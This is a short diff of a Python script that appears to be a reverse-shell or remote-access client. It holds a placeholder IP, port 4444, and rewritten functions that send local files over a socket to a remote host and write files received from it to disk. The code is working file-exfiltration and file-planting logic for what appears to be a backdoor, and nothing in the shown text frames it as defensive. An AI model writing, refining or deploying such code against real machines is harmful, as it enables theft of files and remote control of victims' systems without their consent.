@@ -6,21 +6,28 @@ IP = "[IP PLACEHOLDER]"
 PORT = 4444
 
 
-def upload_file(s, file_name):
-    with open(file_name, "wb") as f:
-        raw_data = s.recv(1024)
-        while raw_data:
-            f.write(raw_data)
-            raw_data = s.recv(1024)
-    print("[+] Download Finished!")
+def upload_file(s, filename):
+    file_bytes = s.recv(10000000)
+    try:
+        if file_bytes.decode() == "ERROR":
+            return
+    except:
+        pass
+    with open(filename, "wb") as f:
+        f.write(file_bytes)
 
 
-def download_file(s, file_name):
-	with open(file_name, 'rb')as f:
-	    data = f.read(1024)
-	    while data:
-	        s.send(data)
-	        data = f.read(1024)
+def download_file(s, filename):
+    try:
+        size = os.stat(filename).st_size
+        if int(size) < 10000000:
+            with open(filename, "rb") as f:
+                data = f.read()
+                s.sendall(data)
+        else:
+            s.sendall("ERROR".encode())
+    except:
+        s.sendall("ERROR".encode())
 
 
 try:
